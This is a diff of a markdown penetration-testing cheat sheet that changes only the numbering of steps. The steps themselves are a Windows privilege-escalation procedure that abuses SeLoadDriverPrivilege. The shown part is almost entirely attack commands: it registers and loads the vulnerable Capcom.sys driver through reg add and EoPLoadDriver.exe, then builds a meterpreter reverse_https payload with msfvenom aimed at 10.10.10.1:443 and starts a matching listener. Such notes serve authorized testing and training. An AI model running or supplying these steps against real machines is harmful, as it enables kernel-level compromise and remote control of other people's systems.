@@ -1492,18 +1492,18 @@ SeLoadDriverPrivilege
 git clone https://github.com/rednexusacademy/SeLoadDriverPrivilege.git
 ```
 - add tge Capcom.sys in C:\Users\Public\Desktop\Capcom.sys
-2- add vulnerable driver to registry
+- add vulnerable driver to registry
 ```text
 reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\Public\Desktop\Capcom.sys"
 reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 .\EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
-3- ensure driver is not working with : http://www.nirsoft.net/utils/driverview.html
+- ensure driver is not working with : http://www.nirsoft.net/utils/driverview.html
 ```text
 .\DriverView.exe  /stext drivers.txt
 cat drivers.txt | Select-String -pattern Capcom
 ```
-4- create revershell with msfvenom and then name it as revshell.exe and put that in
+- create revershell with msfvenom and then name it as revshell.exe and put that in
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.1 LPORT=443 -f exe -o revshell.exe
 sudo msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_https; set LHOST 10.10.10.1; set LPORT 443; set EXITONSESSION false; set EXITFUNC thread; run -j"
